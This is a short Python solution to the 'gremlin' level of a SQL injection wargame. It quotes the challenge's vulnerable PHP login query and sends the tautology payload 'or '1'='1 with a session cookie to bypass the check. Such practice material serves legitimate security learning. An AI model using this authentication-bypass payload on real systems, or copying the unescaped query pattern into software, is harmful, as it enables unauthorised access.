import requests

"""
<?php
  include "./config.php";
  login_chk();
  $db = dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysqli_fetch_array(mysqli_query($db,$query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
"""

url = "https://los.eagle-jump.org/gremlin_bbc5af7bed14aa50b84986f2de742f31.php"
payload = {"id":"1","pw":"'or '1'='1"}
cookie = dict(PHPSESSID="tv814q1qgkcg3pg22pjgl9fc95")
r = requests.get(url,params=payload,cookies=cookie)
#print(r.text)
if 'Clear' in r.text:
    print("clear")
else:
    print("try again")

